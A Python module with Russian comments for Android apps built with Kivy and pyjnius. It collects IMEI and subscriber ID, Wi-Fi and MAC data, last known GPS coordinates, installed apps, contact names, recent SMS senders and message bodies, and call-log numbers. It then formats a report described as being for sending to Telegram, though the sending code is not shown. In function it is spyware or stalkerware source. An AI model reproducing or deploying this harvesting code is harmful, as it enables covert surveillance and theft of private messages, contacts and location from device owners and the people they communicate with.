"""
Расширенный сбор информации об Android устройстве
Использует pyjnius для доступа к Android API
"""
import os
import json
import subprocess
import socket
import platform
from datetime import datetime


def get_android_info_extended():
    """Собирает максимальную информацию об Android устройстве"""
    info = {}
    
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        
        # Android классы
        Build = autoclass('android.os.Build')
        TelephonyManager = autoclass('android.telephony.TelephonyManager')
        LocationManager = autoclass('android.location.LocationManager')
        BatteryManager = autoclass('android.os.BatteryManager')
        ActivityManager = autoclass('android.app.ActivityManager')
        Context = autoclass('android.content.Context')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        
        mActivity = PythonActivity.mActivity
        context = mActivity.getApplicationContext()
        
        # ========== СИСТЕМНАЯ ИНФОРМАЦИЯ ==========
        info['system'] = {
            'manufacturer': str(Build.MANUFACTURER),
            'model': str(Build.MODEL),
            'brand': str(Build.BRAND),
            'device': str(Build.DEVICE),
            'product': str(Build.PRODUCT),
            'hardware': str(Build.HARDWARE),
            'android_version': str(Build.VERSION.RELEASE),
            'sdk_version': str(Build.VERSION.SDK_INT),
            'security_patch': str(Build.VERSION.SECURITY_PATCH) if hasattr(Build.VERSION, 'SECURITY_PATCH') else 'Unknown',
            'build_id': str(Build.ID),
            'build_type': str(Build.TYPE),
            'build_user': str(Build.USER),
            'build_time': str(Build.TIME),
            'bootloader': str(Build.BOOTLOADER),
            'cpu_abi': str(Build.CPU_ABI),
            'cpu_abi2': str(Build.CPU_ABI2) if hasattr(Build, 'CPU_ABI2') else 'Unknown',
            'display': str(Build.DISPLAY),
            'fingerprint': str(Build.FINGERPRINT),
            'host': str(Build.HOST),
            'tags': str(Build.TAGS),
        }
        
        # ========== ИНФОРМАЦИЯ О ТЕЛЕФОНЕ ==========
        try:
            telephony = mActivity.getSystemService(Context.TELEPHONY_SERVICE)
            info['telephony'] = {
                'phone_type': str(telephony.getPhoneType()),
                'network_operator': str(telephony.getNetworkOperator()),
                'network_operator_name': str(telephony.getNetworkOperatorName()),
                'sim_operator': str(telephony.getSimOperator()),
                'sim_operator_name': str(telephony.getSimOperatorName()),
                'sim_country_iso': str(telephony.getSimCountryIso()),
                'network_country_iso': str(telephony.getNetworkCountryIso()),
                'is_roaming': str(telephony.isNetworkRoaming()),
                'sim_state': str(telephony.getSimState()),
            }
            
            # IMEI и другие идентификаторы (требуют разрешения)
            try:
                if hasattr(telephony, 'getDeviceId'):
                    info['telephony']['device_id'] = str(telephony.getDeviceId())
            except:
                pass
                
            try:
                if hasattr(telephony, 'getImei'):
                    info['telephony']['imei'] = str(telephony.getImei())
            except:
                pass
                
            try:
                if hasattr(telephony, 'getSubscriberId'):
                    info['telephony']['subscriber_id'] = str(telephony.getSubscriberId())
            except:
                pass
        except Exception as e:
            info['telephony'] = {'error': str(e)}
        
        # ========== СЕТЕВАЯ ИНФОРМАЦИЯ ==========
        info['network'] = {}
        try:
            # WiFi информация
            wifi_manager = mActivity.getSystemService(Context.WIFI_SERVICE)
            if wifi_manager:
                wifi_info = wifi_manager.getConnectionInfo()
                if wifi_info:
                    info['network']['wifi'] = {
                        'ssid': str(wifi_info.getSSID()),
                        'bssid': str(wifi_info.getBSSID()),
                        'ip_address': str(wifi_info.getIpAddress()),
                        'link_speed': str(wifi_info.getLinkSpeed()),
                        'rssi': str(wifi_info.getRssi()),
                        'network_id': str(wifi_info.getNetworkId()),
                    }
        except Exception as e:
            info['network']['wifi_error'] = str(e)
        
        # MAC адреса
        try:
            import subprocess
            result = subprocess.run(['cat', '/sys/class/net/wlan0/address'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                info['network']['wifi_mac'] = result.stdout.strip()
        except:
            pass
        
        # IP адреса
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['network']['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            info['network']['local_ip'] = 'Unknown'
        
        # ========== ИНФОРМАЦИЯ О БАТАРЕЕ ==========
        try:
            battery = mActivity.getSystemService(Context.BATTERY_SERVICE)
            if battery:
                info['battery'] = {
                    'level': str(battery.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)),
                    'status': str(battery.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)),
                    'health': str(battery.getIntProperty(BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER)),
                    'technology': str(battery.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW)),
                    'voltage': str(battery.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE)),
                    'temperature': str(battery.getIntProperty(BatteryManager.BATTERY_PROPERTY_ENERGY_COUNTER)),
                }
        except Exception as e:
            info['battery'] = {'error': str(e)}
        
        # ========== ПАМЯТЬ И ПРОЦЕССОР ==========
        try:
            activity_manager = mActivity.getSystemService(Context.ACTIVITY_SERVICE)
            mem_info = autoclass('android.app.ActivityManager$MemoryInfo')()
            activity_manager.getMemoryInfo(mem_info)
            
            info['memory'] = {
                'total_mem': str(mem_info.totalMem),
                'available_mem': str(mem_info.availMem),
                'threshold': str(mem_info.threshold),
                'low_memory': str(mem_info.lowMemory),
            }
        except Exception as e:
            info['memory'] = {'error': str(e)}
        
        # Информация о процессоре
        try:
            import subprocess
            result = subprocess.run(['cat', '/proc/cpuinfo'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                cpu_info = result.stdout
                info['cpu'] = {
                    'info': cpu_info[:500],  # Первые 500 символов
                }
        except:
            pass
        
        # ========== ГЕОЛОКАЦИЯ ==========
        try:
            location_manager = mActivity.getSystemService(Context.LOCATION_SERVICE)
            if location_manager:
                providers = location_manager.getProviders(True)
                info['location'] = {
                    'providers': [str(p) for p in providers],
                    'gps_enabled': str(location_manager.isProviderEnabled(LocationManager.GPS_PROVIDER)),
                    'network_enabled': str(location_manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)),
                }
                
                # Попытка получить последнюю известную локацию
                try:
                    last_location = location_manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    if last_location:
                        info['location']['last_known'] = {
                            'latitude': str(last_location.getLatitude()),
                            'longitude': str(last_location.getLongitude()),
                            'accuracy': str(last_location.getAccuracy()),
                            'altitude': str(last_location.getAltitude()),
                            'time': str(last_location.getTime()),
                        }
                except:
                    pass
        except Exception as e:
            info['location'] = {'error': str(e)}
        
        # ========== ПРИЛОЖЕНИЯ ==========
        try:
            package_manager = mActivity.getPackageManager()
            packages = package_manager.getInstalledPackages(0)
            info['apps'] = {
                'total_count': str(len(packages)),
                'installed_apps': []
            }
            
            # Собираем информацию о первых 50 приложениях
            for i, package in enumerate(packages[:50]):
                try:
                    app_info = {
                        'package_name': str(package.packageName),
                        'version_name': str(package.versionName) if package.versionName else 'Unknown',
                        'version_code': str(package.versionCode),
                    }
                    info['apps']['installed_apps'].append(app_info)
                except:
                    pass
        except Exception as e:
            info['apps'] = {'error': str(e)}
        
        # ========== КОНТАКТЫ ==========
        try:
            content_resolver = mActivity.getContentResolver()
            contacts_uri = autoclass('android.provider.ContactsContract$Contacts').CONTENT_URI
            cursor = content_resolver.query(contacts_uri, None, None, None, None)
            
            if cursor:
                contacts = []
                while cursor.moveToNext() and len(contacts) < 100:  # Первые 100 контактов
                    try:
                        name_idx = cursor.getColumnIndex('display_name')
                        if name_idx >= 0:
                            name = cursor.getString(name_idx)
                            contacts.append({'name': name})
                    except:
                        pass
                cursor.close()
                info['contacts'] = {
                    'count': str(len(contacts)),
                    'sample': contacts[:20]  # Первые 20 для примера
                }
        except Exception as e:
            info['contacts'] = {'error': str(e)}
        
        # ========== SMS ==========
        try:
            content_resolver = mActivity.getContentResolver()
            sms_uri = autoclass('android.provider.Telephony$Sms').CONTENT_URI
            cursor = content_resolver.query(sms_uri, None, None, None, 'date DESC LIMIT 50')
            
            if cursor:
                sms_list = []
                while cursor.moveToNext():
                    try:
                        address_idx = cursor.getColumnIndex('address')
                        body_idx = cursor.getColumnIndex('body')
                        date_idx = cursor.getColumnIndex('date')
                        
                        if address_idx >= 0 and body_idx >= 0:
                            sms_list.append({
                                'address': cursor.getString(address_idx) if address_idx >= 0 else '',
                                'body': cursor.getString(body_idx)[:100] if body_idx >= 0 else '',  # Первые 100 символов
                                'date': str(cursor.getLong(date_idx)) if date_idx >= 0 else '',
                            })
                    except:
                        pass
                cursor.close()
                info['sms'] = {
                    'count': str(len(sms_list)),
                    'recent': sms_list[:20]  # Последние 20 SMS
                }
        except Exception as e:
            info['sms'] = {'error': str(e)}
        
        # ========== ИСТОРИЯ ЗВОНКОВ ==========
        try:
            content_resolver = mActivity.getContentResolver()
            calls_uri = autoclass('android.provider.CallLog$Calls').CONTENT_URI
            cursor = content_resolver.query(calls_uri, None, None, None, 'date DESC LIMIT 50')
            
            if cursor:
                calls = []
                while cursor.moveToNext():
                    try:
                        number_idx = cursor.getColumnIndex('number')
                        type_idx = cursor.getColumnIndex('type')
                        date_idx = cursor.getColumnIndex('date')
                        duration_idx = cursor.getColumnIndex('duration')
                        
                        if number_idx >= 0:
                            calls.append({
                                'number': cursor.getString(number_idx) if number_idx >= 0 else '',
                                'type': str(cursor.getInt(type_idx)) if type_idx >= 0 else '',  # 1=входящий, 2=исходящий, 3=пропущенный
                                'date': str(cursor.getLong(date_idx)) if date_idx >= 0 else '',
                                'duration': str(cursor.getInt(duration_idx)) if duration_idx >= 0 else '',
                            })
                    except:
                        pass
                cursor.close()
                info['calls'] = {
                    'count': str(len(calls)),
                    'recent': calls[:20]  # Последние 20 звонков
                }
        except Exception as e:
            info['calls'] = {'error': str(e)}
        
        # ========== ДОПОЛНИТЕЛЬНАЯ ИНФОРМАЦИЯ ==========
        info['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info['platform'] = platform.system()
        info['python_version'] = f"{platform.python_version()}"
        
        # Информация о файловой системе
        try:
            import subprocess
            result = subprocess.run(['df', '/'], capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                info['storage'] = {
                    'df_output': result.stdout[:200]  # Первые 200 символов
                }
        except:
            pass
        
    except ImportError:
        # Если pyjnius не доступен, используем базовый метод
        info = get_basic_info()
    except Exception as e:
        info['error'] = str(e)
        info['basic_info'] = get_basic_info()
    
    return info


def get_basic_info():
    """Базовый сбор информации без pyjnius"""
    info = {}
    
    try:
        import subprocess
        
        # Системная информация через getprop
        props = [
            'ro.build.version.release',
            'ro.product.model',
            'ro.product.manufacturer',
            'ro.product.brand',
            'ro.product.device',
            'ro.build.id',
            'ro.build.type',
            'ro.build.user',
            'ro.build.version.sdk',
        ]
        
        for prop in props:
            try:
                result = subprocess.run(['getprop', prop], 
                                      capture_output=True, text=True, timeout=2)
                if result.returncode == 0:
                    key = prop.replace('ro.', '').replace('.', '_')
                    info[key] = result.stdout.strip()
            except:
                pass
        
        # IP адрес
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            info['local_ip'] = 'Unknown'
        
        info['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info['platform'] = platform.system()
        
    except Exception as e:
        info['error'] = str(e)
    
    return info


def format_info_for_telegram(info):
    """Форматирует информацию для отправки в Telegram"""
    message_parts = []
    
    message_parts.append("📱 РАСШИРЕННАЯ ИНФОРМАЦИЯ О УСТРОЙСТВЕ\n")
    
    # Системная информация
    if 'system' in info:
        sys_info = info['system']
        message_parts.append("🖥️ СИСТЕМА:")
        message_parts.append(f"├─ Производитель: {sys_info.get('manufacturer', 'Unknown')}")
        message_parts.append(f"├─ Модель: {sys_info.get('model', 'Unknown')}")
        message_parts.append(f"├─ Android: {sys_info.get('android_version', 'Unknown')}")
        message_parts.append(f"├─ SDK: {sys_info.get('sdk_version', 'Unknown')}")
        message_parts.append(f"└─ Build ID: {sys_info.get('build_id', 'Unknown')}")
        message_parts.append("")
    
    # Телефония
    if 'telephony' in info and 'error' not in info['telephony']:
        tel_info = info['telephony']
        message_parts.append("📞 ТЕЛЕФОНИЯ:")
        message_parts.append(f"├─ Оператор: {tel_info.get('network_operator_name', 'Unknown')}")
        message_parts.append(f"├─ SIM оператор: {tel_info.get('sim_operator_name', 'Unknown')}")
        message_parts.append(f"└─ Страна: {tel_info.get('sim_country_iso', 'Unknown')}")
        message_parts.append("")
    
    # Сеть
    if 'network' in info:
        net_info = info['network']
        message_parts.append("🌐 СЕТЬ:")
        if 'local_ip' in net_info:
            message_parts.append(f"├─ IP: {net_info['local_ip']}")
        if 'wifi' in net_info:
            wifi = net_info['wifi']
            message_parts.append(f"├─ WiFi SSID: {wifi.get('ssid', 'Unknown')}")
            message_parts.append(f"└─ WiFi MAC: {net_info.get('wifi_mac', 'Unknown')}")
        message_parts.append("")
    
    # Батарея
    if 'battery' in info and 'error' not in info['battery']:
        bat_info = info['battery']
        message_parts.append(f"🔋 БАТАРЕЯ: {bat_info.get('level', 'Unknown')}%")
        message_parts.append("")
    
    # Память
    if 'memory' in info and 'error' not in info['memory']:
        mem_info = info['memory']
        total_mb = int(mem_info.get('total_mem', 0)) // (1024 * 1024)
        avail_mb = int(mem_info.get('available_mem', 0)) // (1024 * 1024)
        message_parts.append(f"💾 ПАМЯТЬ: {avail_mb}MB / {total_mb}MB свободно")
        message_parts.append("")
    
    # Приложения
    if 'apps' in info and 'error' not in info['apps']:
        message_parts.append(f"📦 ПРИЛОЖЕНИЙ: {info['apps'].get('total_count', 'Unknown')}")
        message_parts.append("")
    
    # Контакты
    if 'contacts' in info and 'error' not in info['contacts']:
        message_parts.append(f"👥 КОНТАКТОВ: {info['contacts'].get('count', 'Unknown')}")
        message_parts.append("")
    
    # SMS
    if 'sms' in info and 'error' not in info['sms']:
        message_parts.append(f"💬 SMS: {info['sms'].get('count', 'Unknown')} сообщений")
        message_parts.append("")
    
    # Звонки
    if 'calls' in info and 'error' not in info['calls']:
        message_parts.append(f"📞 ЗВОНКОВ: {info['calls'].get('count', 'Unknown')} записей")
        message_parts.append("")
    
    # Геолокация
    if 'location' in info and 'error' not in info['location']:
        loc_info = info['location']
        if 'last_known' in loc_info:
            loc = loc_info['last_known']
            message_parts.append("📍 ГЕОЛОКАЦИЯ:")
            message_parts.append(f"├─ Широта: {loc.get('latitude', 'Unknown')}")
            message_parts.append(f"└─ Долгота: {loc.get('longitude', 'Unknown')}")
            message_parts.append("")
    
    message_parts.append(f"⏰ ВРЕМЯ: {info.get('timestamp', 'Unknown')}")
    
    return "\n".join(message_parts)
